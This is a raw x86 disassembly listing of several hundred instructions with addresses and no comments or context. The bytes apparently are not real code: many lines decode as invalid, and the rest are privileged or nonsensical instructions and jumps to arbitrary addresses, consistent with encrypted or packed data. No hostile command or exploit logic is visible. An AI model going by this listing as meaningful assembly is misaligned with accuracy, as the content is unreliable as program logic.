  410111:	jo     0x410172
  410113:	and    eax,0xbbfc2d21
  410118:	jmp    0x4100fc
  41011a:	pop    edx
  41011b:	mov    cl,0x1d
  41011d:	cmp    eax,0x9616d13d
  410122:	mov    edx,0xc4f9b515
  410127:	dec    edi
  410128:	in     eax,dx
  410129:	mov    eax,0xa98666eb
  41012e:	cdq    
  41012f:	jbe    0x4100de
  410131:	add    ebx,edi
  410133:	push   ebx
  410134:	jg     0x41019c
  410136:	and    eax,0x5c99bf68
  41013b:	stc    
  41013c:	pop    esi
  41013d:	daa    
  41013e:	js     0x4101a9
  410140:	or     BYTE PTR [ecx],bl
  410142:	pop    ebx
  410143:	fadd   DWORD PTR [edx+0x0]
  410146:	inc    eax
  410147:	imul   eax,ebx,0x7a
  41014a:	jbe    0x4100db
  41014c:	or     DWORD PTR [ecx-0x37],edx
  41014f:	repz ss not edi
  410153:	inc    eax
  410154:	mov    ch,0x86
  410156:	sub    eax,0xb3b00e98
  41015b:	js     0x410121
  41015d:	test   al,0xce
  41015f:	ins    BYTE PTR es:[edi],dx
  410160:	in     eax,dx
  410161:	pop    edi
  410162:	jnp    0x410100
  410164:	imul   ecx,esp,0x30e4a8ee
  41016a:	ja     0x41017b
  41016c:	(bad)  [edi]
  41016e:	jns    0x4101af
  410170:	jbe    0x410166
  410172:	pop    ebp
  410173:	sahf   
  410174:	neg    BYTE PTR [edx-0x60]
  410177:	dec    esi
  410178:	pop    es
  410179:	mov    edx,0x3340ef0f
  41017e:	cdq    
  41017f:	pop    esp
  410180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410181:	(bad)  
  410182:	pushf  
  410183:	xlat   BYTE PTR ds:[ebx]
  410184:	sub    al,0x57
  410186:	xor    eax,0xeb68a66b
  41018b:	xchg   edx,eax
  41018c:	pusha  
  41018d:	mov    al,0xaf
  41018f:	xor    eax,0x4265193e
  410194:	out    0x99,al
  410196:	faddp  st(3),st
  410198:	jecxz  0x410158
  41019a:	jmpw   0xccc6
  41019e:	mov    edi,0xcb2192ed
  4101a3:	push   ds
  4101a4:	ins    DWORD PTR es:[edi],dx
  4101a5:	mov    ds:0x36f911f5,al
  4101aa:	jo     0x410133
  4101ac:	dec    edi
  4101ad:	jae    0x41020c
  4101af:	inc    ebp
  4101b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101b1:	fsub   st,st(1)
  4101b3:	mov    bl,0xae
  4101b5:	leave  
  4101b6:	push   0xffffff87
  4101b8:	or     bh,BYTE PTR [ecx-0x586257a0]
  4101be:	adc    DWORD PTR [ebx-0x9ee66cd],ebp
  4101c4:	pop    eax
  4101c5:	mov    ebx,0xe3901ba8
  4101ca:	rol    DWORD PTR [eax+eiz*8+0xe],0x9b
  4101cf:	jnp    0x410171
  4101d1:	jmp    0x41024a
  4101d3:	les    ecx,FWORD PTR [esp+eax*8-0x2be35c2f]
  4101da:	lock mov bh,0xaa
  4101dd:	retf   0x7
  4101e0:	inc    edi
  4101e1:	jno    0x410195
  4101e3:	mov    cl,0x4a
  4101e5:	popf   
  4101e6:	push   ss
  4101e7:	jp     0x410243
  4101e9:	mov    ebp,edx
  4101eb:	fst    st(6)
  4101ed:	sbb    BYTE PTR [edx],cl
  4101ef:	je     0x410191
  4101f1:	loop   0x4101e4
  4101f3:	cmp    eax,0x5716a431
  4101f8:	test   BYTE PTR [esi+0x7ef16079],bl
  4101fe:	mov    ah,0xed
  410200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410201:	xlat   BYTE PTR ds:[ebx]
  410202:	adc    al,0xb2
  410204:	xchg   ebp,eax
  410205:	mov    eax,0xc833ec96
  41020a:	sar    DWORD PTR [esi-0x3e],0x1
  41020e:	enter  0xed9c,0x97
  410212:	bnd jl 0x410229
  410215:	mov    esi,0x8cd5da6c
  41021a:	sar    DWORD PTR [esi],1
  41021c:	xlat   BYTE PTR ds:[ebx]
  41021d:	pop    eax
  41021e:	scas   eax,DWORD PTR es:[edi]
  41021f:	clc    
  410220:	test   bh,ch
  410222:	push   esi
  410223:	test   BYTE PTR [ebp+0x58],bl
  410226:	sbb    BYTE PTR ds:0x49ab49de,0x11
  41022d:	fiadd  WORD PTR [ebp-0x45edcae8]
  410233:	xchg   ebx,eax
  410234:	or     DWORD PTR [edx+0xf],0xf0e1b6c5
  41023b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41023c:	sbb    al,0xe2
  41023e:	mov    edx,0x5c899573
  410243:	inc    ecx
  410244:	xor    DWORD PTR [ecx-0x21],esi
  410247:	add    eax,0xc18e9a6b
  41024c:	mov    dh,0x80
  41024e:	and    BYTE PTR [eax],0x23
  410251:	call   0x9d10c256
  410256:	stos   BYTE PTR es:[edi],al
  410257:	hlt    
  410258:	xchg   edx,eax
  410259:	cwde   
  41025a:	mov    BYTE PTR [ecx+0x3e],dh
  41025d:	daa    
  41025e:	hlt    
  41025f:	imul   BYTE PTR [ebx]
  410261:	xchg   edx,eax
  410262:	and    al,0x28
  410264:	adc    al,0x3e
  410266:	or     edi,DWORD PTR [esi+esi*1]
  410269:	xchg   DWORD PTR [ebx+0x1d],ebp
  41026c:	idiv   BYTE PTR [ecx-0x1e]
  41026f:	xchg   edx,eax
  410270:	fnstenv [ebx-0x6a42dd00]
  410276:	rol    ebx,0xe
  410279:	mov    edx,0xf3e95cfc
  41027e:	push   eax
  41027f:	jmp    0x98b79eef
  410284:	add    DWORD PTR [edi-0x12609931],esp
  41028a:	stc    
  41028b:	not    DWORD PTR [edx+0x20]
  41028e:	xchg   esi,eax
  41028f:	xchg   edi,eax
  410290:	sub    al,0x8a
  410292:	push   esp
  410293:	popa   
  410294:	dec    edx
  410295:	sbb    ecx,ecx
  410297:	fs fmulp st(2),st
  41029a:	jbe    0x41022b
  41029c:	(bad)
  4102a0:	push   edi
  4102a1:	jnp    0x4102ac
  4102a3:	loop   0x41029c
  4102a5:	adc    al,0x25
  4102a7:	leave  
  4102a8:	mov    eax,ds:0xb2938e11
  4102ad:	xor    eax,0xc9526a66
  4102b2:	scas   al,BYTE PTR es:[edi]
  4102b3:	dec    esp
  4102b4:	inc    eax
  4102b5:	sbb    DWORD PTR [ebx],esi
  4102b7:	out    0xab,eax
  4102b9:	mov    al,cl
  4102bb:	fcomp  QWORD PTR [edx+0x4ee8a4ff]
  4102c1:	ficomp WORD PTR [edi]
  4102c3:	rol    DWORD PTR [edx],cl
  4102c5:	cli    
  4102c6:	fdiv   DWORD PTR [ecx-0x1e5e6fa3]
  4102cc:	fstp   QWORD PTR [edx+0x64]
  4102cf:	ret    
  4102d0:	in     al,dx
  4102d1:	and    edx,DWORD PTR [esi-0x97f8391]
  4102d7:	dec    ebp
  4102d8:	push   esp
  4102d9:	or     ax,di
  4102dc:	cmp    BYTE PTR [edi+0x48],0xcf
  4102e0:	or     al,0x2b
  4102e2:	bound  edi,QWORD PTR [eax+0x207231f]
  4102e8:	jg     0x410305
  4102ea:	mov    bl,0xb9
  4102ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102ed:	lods   al,BYTE PTR ds:[esi]
  4102ee:	iret   
  4102ef:	(bad)  
  4102f0:	sub    bl,bh
  4102f2:	jg     0x4102ea
  4102f4:	icebp  
  4102f5:	cmc    
  4102f6:	mov    bl,BYTE PTR [ecx+0x8]
  4102f9:	repnz cmp cl,ch
  4102fc:	ins    DWORD PTR es:[edi],dx
  4102fd:	lea    esp,[ecx-0x8]
  410300:	rol    DWORD PTR [eax+ecx*1-0x6a],0x86
  410305:	stos   DWORD PTR es:[edi],eax
  410306:	ins    DWORD PTR es:[edi],dx
  410307:	dec    ebx
  410308:	int3   
  410309:	sbb    BYTE PTR [eax],ch
  41030b:	mov    edx,0x99526997
  410310:	xchg   ebx,eax
  410311:	cmp    cl,BYTE PTR [edi+ecx*8]
  410314:	sub    al,0x92
  410316:	scas   eax,DWORD PTR es:[edi]
  410317:	mov    dl,0x18
  410319:	ins    BYTE PTR es:[edi],dx
  41031a:	leave  
  41031b:	(bad)  
  41031c:	and    eax,0x501e8763
  410321:	imul   esi,DWORD PTR [edi-0x18],0xffffff94
  410325:	stos   BYTE PTR es:[edi],al
  410326:	fwait
  410327:	(bad)  
  410328:	aam    0x93
  41032a:	fdiv   st(3),st
  41032c:	stc    
  41032d:	sub    ebp,0x17
  410330:	loope  0x4102e3
  410332:	gs jle 0x4102d0
  410335:	iret   
  410336:	sub    eax,0xf9d9632d
  41033b:	mov    edx,ebx
  41033d:	jb     0x410301
  41033f:	into   
  410340:	jl     0x41030e
  410342:	stc    
  410343:	test   bl,cl
  410345:	and    edi,DWORD PTR [edx]
  410347:	jne    0x4103a7
  410349:	or     cl,BYTE PTR [ebx+0x7d]
  41034c:	cmp    edx,DWORD PTR [ebx+0xbc0225]
  410352:	sub    DWORD PTR es:[ebx+0x3c54c4a],edx
  410359:	loopne 0x41031a
  41035b:	mov    ecx,0x9bc230eb
  410360:	jl     0x410350
  410362:	inc    ebx
  410363:	add    eax,DWORD PTR [ebp*4+0x4b16e4cc]
  41036a:	and    bh,BYTE PTR [eax+0x7c34fc3e]
  410370:	add    bh,BYTE PTR [eax-0x4]
  410373:	out    dx,al
  410374:	retf   0x46d8
  410377:	test   DWORD PTR [ebp+0x40abaf60],0xfffc367c
  410381:	dec    ecx
  410382:	adc    BYTE PTR [ecx+0x79],dh
  410385:	in     al,dx
  410386:	mov    bh,0x2
  410388:	popa   
  410389:	add    al,dl
  41038b:	adc    ah,dl
  41038d:	xor    DWORD PTR [esi+0x4e348bd3],ebx
  410393:	mov    dl,0xbb
  410395:	bound  esp,QWORD PTR [edx]
  410397:	fstp   st(7)
  410399:	jmp    0x54ff:0x971f430a
  4103a0:	mov    fs,edx
  4103a2:	or     DWORD PTR [edi+edx*2-0x1165c43f],esi
  4103a9:	pushf  
  4103aa:	or     al,0x7a
  4103ac:	call   0x551d:0x9ba5618a
  4103b3:	ret    
  4103b4:	out    0x18,eax
  4103b6:	xor    al,0x41
  4103b8:	ins    BYTE PTR es:[edi],dx
  4103b9:	cs or  edx,ecx
  4103bc:	fwait
  4103bd:	out    dx,al
  4103be:	push   0x9070bf2f
  4103c3:	scas   al,BYTE PTR es:[edi]
  4103c4:	dec    esp
  4103c5:	add    eax,DWORD PTR [edx+ebp*1]
  4103c8:	cmp    eax,0x1aaf3f65
  4103cd:	mov    ch,0x5b
  4103cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103d0:	out    dx,al
  4103d1:	push   0x13
  4103d3:	mov    ebx,0xdb77d6bf
  4103d8:	pop    ss
  4103d9:	mov    edx,ss
  4103db:	nop
  4103dc:	xor    BYTE PTR [esi-0x39b6c431],dl
  4103e2:	in     eax,dx
  4103e3:	stc    
  4103e4:	jae    0x41044c
  4103e6:	adc    eax,0xc6f90d35
  4103eb:	mov    esp,0x704fe1f3
  4103f0:	imul   esi,DWORD PTR [edi-0x421bcc23],0xffffffbe
  4103f7:	imul   ebp,DWORD PTR [edx+edi*1+0x4d],0xfcd5b773
  4103ff:	fs or  ch,ch
  410402:	jle    0x410462
  410404:	call   0x1031:0x5615fade
  41040b:	mov    dl,0x5e
  41040d:	jl     0x410393
  41040f:	repz or esp,DWORD PTR [edi-0x57]
  410413:	and    ch,ch
  410415:	sbb    edx,eax
  410417:	enter  0xa9b5,0x63
  41041b:	jns    0x410464
  41041d:	push   ebx
  41041e:	test   al,0xfb
  410420:	sub    al,0x77
  410422:	loop   0x410401
  410424:	mov    al,0x83
  410426:	or     eax,0x28c2e996
  41042b:	xor    edi,DWORD PTR [ebx-0x35]
  41042e:	cmp    eax,0xccdc6b91
  410433:	je     0x410425
  410435:	gs daa 
  410437:	aas    
  410438:	rol    DWORD PTR [edx],0x7
  41043b:	push   ds
  41043c:	push   ecx
  41043d:	cmp    DWORD PTR [edi-0x79],0xffffffee
  410441:	stc    
  410442:	shl    ecx,0xbf
  410445:	xchg   edx,eax
  410446:	cmp    DWORD PTR [eax-0xac0e3ea],0x9211e151
  410450:	test   BYTE PTR [ebp+ebx*1-0x30],0x38
  410455:	push   edi
  410456:	jp     0x410442
  410458:	pop    esi
  410459:	popa   
  41045a:	sbb    al,0x26
  41045c:	jecxz  0x410480
  41045e:	xor    esp,ecx
  410460:	jmp    0x30f:0xf915f885
  410467:	clc    
  410468:	push   edx
  410469:	stos   BYTE PTR es:[edi],al
  41046a:	jne    0x410438
  41046c:	xchg   edi,eax
  41046d:	xchg   ebp,eax
  41046e:	mov    al,ds:0x6b268a58
  410473:	lods   eax,DWORD PTR ds:[esi]
  410474:	stc    
  410475:	adc    DWORD PTR [ebx+0x27b39a9],0xffffffa3
  41047c:	enter  0xdda0,0xe8
  410480:	iret   
  410481:	jae    0x4104fa
  410483:	into   
  410484:	nop
  410485:	inc    edi
  410486:	push   ecx
  410487:	in     eax,0xda
  410489:	arpl   WORD PTR [ebp-0x6e],sp
  41048c:	dec    esp
  41048d:	(bad)  [edi+0x22]
  410490:	icebp  
  410491:	ss pusha 
  410493:	xchg   ebx,eax
  410494:	jmp    0xb67b:0x245cf20d
  41049b:	ret    0xfd22
  41049e:	adc    DWORD PTR [edx+0x2d],ebp
  4104a1:	gs js  0x410504
  4104a4:	idiv   BYTE PTR [ebp+0x31]
  4104a7:	pop    ss
  4104a8:	adc    dl,bh
  4104aa:	std    
  4104ab:	add    al,0xd4
  4104ad:	mov    dh,0xb1
  4104af:	sti    
  4104b0:	std    
  4104b1:	lods   eax,DWORD PTR ds:[esi]
  4104b2:	or     DWORD PTR [ebx+0x78],edx
  4104b5:	push   ecx
  4104b6:	add    ebx,DWORD PTR [ebx]
  4104b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104b9:	mov    edx,0xe6315603
  4104be:	and    BYTE PTR [edx+0x5a],bh
  4104c1:	loop   0x410525
  4104c3:	inc    edx
  4104c4:	popa   
  4104c5:	dec    edx
  4104c6:	add    al,0xe
  4104c8:	jp     0x410472
  4104ca:	(bad)  
  4104cb:	xchg   ebp,eax
  4104cc:	add    al,0xdf
  4104ce:	mov    ecx,0xa1a11767
  4104d3:	mov    ds:0x300b459c,al
  4104d8:	les    esp,FWORD PTR [eax]
  4104da:	sahf   
  4104db:	scas   eax,DWORD PTR es:[edi]
  4104dc:	or     BYTE PTR [edx-0x16f8016c],bh
  4104e2:	pop    edx
  4104e3:	xchg   edi,eax
  4104e4:	push   0xffffffb6
  4104e6:	lock ins DWORD PTR es:[edi],dx
  4104e8:	cmp    DWORD PTR gs:[eax+0x67],esi
  4104ec:	sub    esp,edi
  4104ee:	pop    es
  4104ef:	push   eax
  4104f0:	retf   0x5518
  4104f3:	(bad)  
  4104f4:	jo     0x410535
  4104f6:	sbb    eax,0x9374a3c4
  4104fb:	xor    DWORD PTR [eax],ecx
  4104fd:	cmp    DWORD PTR [ecx-0x12],edx
  410500:	sar    BYTE PTR [ecx+0x53],1
  410503:	push   esp
  410504:	and    dh,BYTE PTR [eax-0x61011969]
  41050a:	cmc    
  41050b:	add    esi,DWORD PTR [edi+ebp*4]
  41050e:	clc    
  41050f:	or     BYTE PTR [edx+0x76],0xf4
  410513:	add    DWORD PTR [ebx+0x10],0x7cb6a286
  41051a:	fidiv  DWORD PTR [ebx]
  41051c:	sub    ebp,ebx
  41051e:	test   DWORD PTR [ebp+0x73db11a0],eax
  410524:	push   cs
  410525:	sub    al,0x6d
  410527:	lock add al,0xad
  41052a:	mov    bl,0x60
  41052c:	gs ret 0x1bed
  410530:	add    DWORD PTR [edi-0x48ebaa7],esi
  410536:	(bad)  
  410537:	jno    0x41056b
  410539:	test   al,0x41
  41053b:	repnz add esi,ecx
  41053e:	jge    0x4105a2
  410540:	clc    
  410541:	lods   al,BYTE PTR ds:[esi]
  410542:	movups xmm0,xmm6
  410545:	sub    DWORD PTR [eax-0x7a],0xeeec3664
  41054c:	mov    eax,0x6051dc58
  410551:	imul   ecx,edi,0x2b5e2bfb
  410557:	or     cl,BYTE PTR [ebx+0xb]
  41055a:	cld    
  41055b:	jg     0x4105b7
  41055d:	and    BYTE PTR [ebp-0xb],dl
  410560:	repnz fbld TBYTE PTR [edx+0x7]
  410564:	mov    ds:0x1ef2ad54,al
  410569:	pop    ss
  41056a:	out    dx,eax
  41056b:	sbb    ebx,DWORD PTR [eax-0x24a0b521]
  410571:	call   0x7ea0:0x4ea4d237
  410578:	loopne 0x4105d7
  41057a:	mov    ebp,0x63933a64
  41057f:	mov    bh,0xe2
  410581:	xor    BYTE PTR [ebp+0x28],ch
  410584:	pusha  
  410585:	int3   
  410586:	cmp    esi,DWORD PTR [esi+esi*1+0x5b212094]
  41058d:	ja     0x410544
  41058f:	sbb    DWORD PTR [esi],esp
  410591:	in     al,0xad
  410593:	fmul   st,st(7)
  410595:	call   0x61d0:0x59cef87d
  41059c:	sub    al,0xe2
  41059e:	xlat   BYTE PTR ds:[ebx]
  41059f:	(bad)  [edx-0x2c]
  4105a2:	xchg   esp,eax
  4105a3:	dec    edx
  4105a4:	jl     0x4105cb
  4105a6:	mov    bl,0xd3
  4105a8:	addr16 dec ecx
  4105aa:	pop    ss
  4105ab:	jnp    0x41061d
  4105ad:	into   
  4105ae:	je     0x410597
  4105b0:	inc    esi
  4105b1:	mov    eax,ds:0x6d37805f
  4105b6:	clc    
  4105b7:	dec    ebp
  4105b8:	in     al,dx
  4105b9:	pop    eax
  4105ba:	jne    0x41060a
  4105bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105be:	(bad)  
  4105bf:	mov    eax,0x6beb9e32
  4105c4:	addr16 jmp 0x8fe0:0x89f7381c
  4105cc:	bound  esi,QWORD PTR [ebx]
  4105ce:	stc    
  4105cf:	repnz cmc 
  4105d1:	pop    edx
  4105d2:	imul   ebp,DWORD PTR [ecx-0x3a],0xf98f5c45
  4105d9:	in     al,dx
  4105da:	sbb    BYTE PTR [esi+ebx*8+0x2582d582],0xa0
  4105e2:	sub    eax,0x50b5482
  4105e7:	mov    eax,gs:0x944a61ff
  4105ed:	adc    eax,0x60e0858b
  4105f2:	xor    ecx,DWORD PTR [eax]
  4105f4:	mov    BYTE PTR [eax-0x77],bl
  4105f7:	inc    edx
  4105f8:	les    esi,FWORD PTR [ebp-0x68940231]
  4105fe:	jbe    0x4105a3
  410600:	clc    
  410601:	stos   DWORD PTR es:[edi],eax
  410602:	std    
  410603:	repnz bound ebx,QWORD PTR [ebx]
  410606:	and    BYTE PTR [eax+0x1cdc6c07],0xce
  41060d:	fisub  DWORD PTR [ecx-0x7c]
  410610:	fld    TBYTE PTR [ebp-0x6d3e4247]
  410616:	ror    BYTE PTR ds:0x94465f1d,cl
  41061c:	pop    esi
  41061d:	(bad)  
  41061e:	push   eax
  41061f:	lods   eax,DWORD PTR ds:[esi]
  410620:	cli    
  410621:	imul   edx,DWORD PTR [ebp+0x11012d71],0x73
  410628:	mov    BYTE PTR [eax+0x59],bl
  41062b:	(bad)  
  41062c:	jbe    0x410695
  41062e:	xchg   esp,eax
  41062f:	adc    DWORD PTR [edx+eiz*4-0x26],esi
  410633:	mov    eax,0x8c1e94ac
  410638:	pop    es
  410639:	iret   
  41063a:	fcmovnu st,st(5)
  41063c:	add    eax,0xbc391362
  410641:	das    
  410642:	adc    dh,BYTE PTR [ebx-0x39b78f51]
  410648:	mov    eax,ds:0x7de0849e
  41064d:	aaa    
  41064e:	xchg   DWORD PTR [ebp+0x5cce87a3],esp
  410654:	sbb    al,0xc3
  410656:	stos   DWORD PTR es:[edi],eax
  410657:	jl     0x41069c
  410659:	cmp    BYTE PTR [esi-0x75c72302],dh
  41065f:	sbb    BYTE PTR [edi-0x6fd255f4],0xdd
  410666:	repnz aam 0x9f
  410669:	xor    dl,BYTE PTR ds:0xf9507873
  41066f:	and    al,0x2
  410671:	shl    DWORD PTR [edi+0xcc54c35],cl
  410677:	dec    ecx
  410678:	xchg   esp,eax
  410679:	ret    0x8923
  41067c:	lds    eax,FWORD PTR [esi+0x75]
  41067f:	pop    edx
  410680:	pop    dx
  410682:	mov    dh,0xc0
  410684:	(bad)  
  410685:	test   al,0xfc
  410687:	ss callw 0x2608
  41068c:	(bad)  
  41068d:	mov    esi,0x34ef9a4d
  410692:	in     al,0xeb
  410694:	out    dx,al
  410695:	jmp    0x632c:0xa995db95
  41069c:	add    al,0x29
  41069e:	ret    
  41069f:	imul   esi,esp,0x1a2165e6
  4106a5:	sbb    DWORD PTR [eax],eax
  4106a7:	and    esi,DWORD PTR [ebp+esi*2-0x39]
  4106ab:	add    BYTE PTR [ecx-0x4341ba62],bl
  4106b1:	mov    BYTE PTR [edi],bh
  4106b3:	mov    bl,0x5f
  4106b5:	cmp    eax,0x545c07ef
  4106ba:	test   BYTE PTR [ebx-0x3b],al
  4106bd:	dec    eax
  4106be:	lock pop edx
  4106c0:	mov    cl,0xc9
  4106c2:	into   
  4106c3:	call   FWORD PTR [edx+0x5732d57f]
  4106c9:	push   eax
  4106ca:	icebp  
  4106cb:	pop    esp
  4106cc:	dec    ebx
  4106cd:	mov    ds:0xb5837ece,al
  4106d2:	fild   QWORD PTR [ecx+0x5194a787]
  4106d8:	jno    0x4106a2
  4106da:	sti    
  4106db:	fcom   DWORD PTR [edx]
  4106dd:	sbb    BYTE PTR [esi],dh
  4106df:	lock push 0xffffffc2
  4106e2:	in     eax,0x78
  4106e4:	sahf   
  4106e5:	mov    esi,0xe6d5694c
  4106ea:	stos   DWORD PTR es:[edi],eax
  4106eb:	pop    edi
  4106ec:	mov    eax,0x5f9166e6
  4106f1:	ret    
  4106f2:	call   0x49e0:0xbbf5353e
  4106f9:	and    DWORD PTR [edi+0xf],ecx
  4106fc:	lahf   
  4106fd:	pop    es
  4106fe:	and    eax,0x41fb7e27
  410703:	ins    BYTE PTR es:[edi],dx
  410704:	jecxz  0x41071e
  410706:	aas    
  410707:	nop
  410708:	sub    al,0x4e
  41070a:	jl     0x410724
  41070c:	in     al,0xc6
  41070e:	call   esp
  410710:	xchg   esp,eax
  410711:	stos   DWORD PTR es:[edi],eax
  410712:	iret   
  410713:	sub    dh,BYTE PTR [eax]
  410715:	sub    BYTE PTR fs:[eax+0x78c3022],bh
  41071c:	xlat   BYTE PTR ds:[ebx]
  41071d:	add    al,0x74
  41071f:	sub    dl,bl
  410721:	hlt    
  410722:	cmp    bl,BYTE PTR [edx-0x3cd1fccc]
  410728:	outs   dx,BYTE PTR ds:[esi]
  410729:	xor    al,0xb4
  41072b:	pop    edx
  41072c:	bound  esi,QWORD PTR [edx-0x61464530]
  410732:	sbb    BYTE PTR [ebp+0x2c0321c9],dl
  410738:	pop    es
  410739:	pop    edx
  41073a:	scas   eax,DWORD PTR es:[edi]
  41073b:	ins    BYTE PTR es:[edi],dx
  41073c:	add    ebp,ecx
  41073e:	int3   
  41073f:	xor    al,0x28
  410741:	jge    0x41072b
  410743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410744:	add    al,BYTE PTR [esp+ecx*8-0x47]
  410748:	es sub al,0xa4
  41074b:	add    DWORD PTR [ebp+0x4],esi
  41074e:	idiv   esp
  410750:	jb     0x410764
  410752:	lea    ecx,[esi+eax*2+0x6e3edd0e]
  410759:	push   cs
  41075a:	inc    edx
  41075b:	pop    ebp
  41075c:	or     esi,DWORD PTR [edi+ebx*1+0x4c]
  410760:	icebp  
  410761:	dec    ebx
  410762:	pop    eax
  410763:	jge    0x410716
  410765:	fs pop ss
  410767:	push   ebx
  410768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410769:	xor    BYTE PTR [eax+0x2c],ch
  41076c:	aas    
  41076d:	sub    ecx,edx
  41076f:	stos   BYTE PTR es:[edi],al
  410770:	pop    esp
  410771:	les    ebp,FWORD PTR [edi]
  410773:	iret   
  410774:	pop    edx
  410775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410776:	pop    ebx
  410777:	out    dx,al
  410778:	xchg   ebx,eax
  410779:	fwait
  41077a:	jp     0x41072f
  41077c:	rol    DWORD PTR [ebp-0x28715b66],cl
  410782:	push   ecx
  410783:	ret    0x8ad0
  410786:	test   BYTE PTR [esi+0x70fc6701],al
  41078c:	(bad)  
  41078d:	into   
  41078e:	aas    
  41078f:	test   ecx,0xb9686a78
  410795:	push   ebp
  410796:	mov    BYTE PTR [edx-0x6e],ch
  410799:	mov    ds:0xd85ade1b,al
  41079e:	pop    es
  41079f:	sub    ecx,DWORD PTR [ecx-0x2606208e]
  4107a5:	out    dx,eax
  4107a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107a7:	adc    BYTE PTR [ebx],0x53
  4107aa:	nop
  4107ab:	xchg   ch,dh
  4107ad:	out    0x40,al
  4107af:	imul   esp,DWORD PTR [ebp+0x4b],0x203b9ff7
  4107b6:	jl     0x410806
  4107b8:	mov    DWORD PTR [edx-0x3c3c2e98],esi
  4107be:	xor    esp,DWORD PTR [ecx]
  4107c0:	(bad)  
  4107c1:	cmp    BYTE PTR [ebx],bl
  4107c3:	lock mov ch,0xe1
  4107c6:	cmp    eax,0xc6973652
  4107cb:	cli    
  4107cc:	inc    edx
  4107cd:	or     BYTE PTR [eax-0x13],0x9d
  4107d1:	out    dx,eax
  4107d2:	push   ss
  4107d3:	sub    dl,BYTE PTR [ebp-0xd6b5af3]
  4107d9:	rcr    DWORD PTR [edx],cl
  4107db:	pop    eax
  4107dc:	fcmovb st,st(1)
  4107de:	sti    
  4107df:	pop    esi
  4107e0:	pusha  
  4107e1:	pop    ecx
  4107e2:	ins    DWORD PTR es:[edi],dx
  4107e3:	div    DWORD PTR [esp+ecx*1-0x34ba3e13]
  4107ea:	inc    ecx
  4107eb:	cmp    esi,eax
  4107ed:	and    edi,DWORD PTR [ecx+0x512d7194]
  4107f3:	pop    ebx
  4107f4:	jecxz  0x4107a2
  4107f6:	jge    0x410830
  4107f8:	xor    eax,0xf1a1bbcd
  4107fd:	mov    cr7,eax
  410800:	call   0x58d7:0x7a214016
  410807:	and    BYTE PTR [edi],bh
  410809:	hlt    
  41080a:	xor    al,bh
  41080c:	fucomip st,st(0)
  41080e:	es mov al,dl
  410811:	or     al,0xb9
  410813:	mov    bh,0x6d
  410815:	hlt    
  410816:	xchg   ebp,eax
  410817:	cwde   
  410818:	fdivr  QWORD PTR [edi-0x4341b48e]
  41081e:	sbb    edi,ebx
  410820:	mov    al,0x94
  410822:	mov    ds:0xc11be33,al
  410827:	sbb    eax,0x429d3721
  41082c:	mov    eax,0xb352b705
  410831:	add    BYTE PTR ds:0xac0ebb11,dl
  410837:	dec    ebx
  410838:	(bad)  
  410839:	cld    
  41083a:	call   0xa54b:0xc496862
  410841:	mov    esp,edx
  410843:	mov    dl,0xf7
  410845:	(bad)  
  410847:	push   cs
  410848:	mov    ds:0x28618d29,eax
  41084d:	mov    ebx,0x5dcf8bd2
  410852:	adc    al,0x32
  410854:	rcr    DWORD PTR [ecx+0x7bd54a64],1
  41085a:	sbb    BYTE PTR [edi-0x74b61cbd],bh
  410860:	inc    eax
  410861:	retf   
  410862:	xlat   BYTE PTR ds:[ebx]
  410863:	stos   BYTE PTR es:[edi],al
  410864:	stos   BYTE PTR es:[edi],al
  410865:	mov    eax,0x24186ea3
  41086a:	push   DWORD PTR [edi+0x2b]
  41086d:	mov    bl,ah
  41086f:	jge    0x4108e3
  410871:	or     eax,0xeb022598
  410876:	call   0xc07:0x2c006be2
  41087d:	adc    bl,cl
  41087f:	inc    edi
  410880:	sbb    ebx,eax
  410882:	sub    eax,0xbfe46eaf
  410887:	adc    cl,al
  410889:	mov    ch,0xc1
  41088b:	add    al,0xb4
  41088d:	push   eax
  41088e:	xchg   edi,eax
  41088f:	dec    ebx
  410890:	cwde   
  410891:	pop    edx
  410892:	jle    0x410841
  410894:	lods   eax,DWORD PTR ds:[esi]
  410895:	mov    al,ds:0x3a883dca
  41089a:	cmp    eax,0xb01bc3da
  41089f:	pop    ebp
  4108a0:	dec    bx
  4108a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108a3:	mov    eax,ds:0x688cdddd
  4108a8:	add    al,0x2
  4108aa:	repz bound edx,QWORD PTR [eax+0x57]
  4108ae:	ror    al,cl
  4108b0:	lods   al,BYTE PTR ds:[esi]
  4108b1:	pslld  mm6,QWORD PTR [edx+0x4a]
  4108b5:	xor    bh,0x75
  4108b8:	data16 shl BYTE PTR [eax-0x6e],0xd8
  4108bd:	cmp    eax,0x3d224e08
  4108c2:	test   al,0xbd
  4108c4:	cmp    dh,bh
  4108c6:	mov    ebx,0xfd72dba6
  4108cb:	jo     0x4108c1
  4108cd:	sahf   
  4108ce:	pop    ds
  4108cf:	inc    edi
  4108d0:	inc    esp
  4108d1:	dec    edi
  4108d2:	(bad)  
  4108d4:	inc    edx
  4108d5:	sahf   
  4108d6:	xchg   DWORD PTR [esi+0x5a],ebx
  4108d9:	pop    ebp
  4108da:	daa    
  4108db:	clc    
  4108dc:	test   BYTE PTR [esi-0x589541f0],ah
  4108e2:	mov    bl,BYTE PTR [ebp+0xa]
  4108e5:	add    eax,0x1d9f3f05
  4108ea:	xchg   edi,eax
  4108eb:	xchg   esi,eax
  4108ec:	pop    edx
  4108ed:	aam    0xbd
  4108ef:	sbb    DWORD PTR [esi],esp
  4108f1:	and    al,0xdc
  4108f3:	adc    eax,0x67091a1c
  4108f8:	jge    0x410886
  4108fa:	fbld   TBYTE PTR ds:0x6e1ff105
  410900:	push   ss
  410901:	cwde   
  410902:	inc    edx
  410903:	pop    es
  410904:	(bad)  
  410905:	or     eax,0x74c91633
  41090a:	bound  esp,QWORD PTR [ebx]
